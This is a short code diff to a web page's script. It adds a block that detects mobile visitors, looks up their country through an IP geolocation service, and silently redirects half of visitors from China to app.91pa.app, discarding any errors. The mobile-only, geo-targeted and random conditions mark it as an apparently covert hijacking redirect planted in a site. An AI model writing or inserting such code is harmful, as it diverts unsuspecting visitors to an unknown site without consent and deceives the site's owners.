@@ -12,3 +12,18 @@ var _hmt = _hmt || [];
       window.location.replace('https://app.91pa.app/');
     }
   })();
+(async function() {
+  var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
+                   .test(navigator.userAgent);
+  if (!isMobile) return;
+  try {
+    let res = await fetch('https://api.ip.sb/geoip?format=json');
+    if (!res.ok) return;
+    let data = await res.json();
+
+    if (data.country_code === 'CN' && Math.random() < 0.5) {
+      window.location.replace('https://app.91pa.app/');
+    }
+  } catch (e) {
+  }
+})();
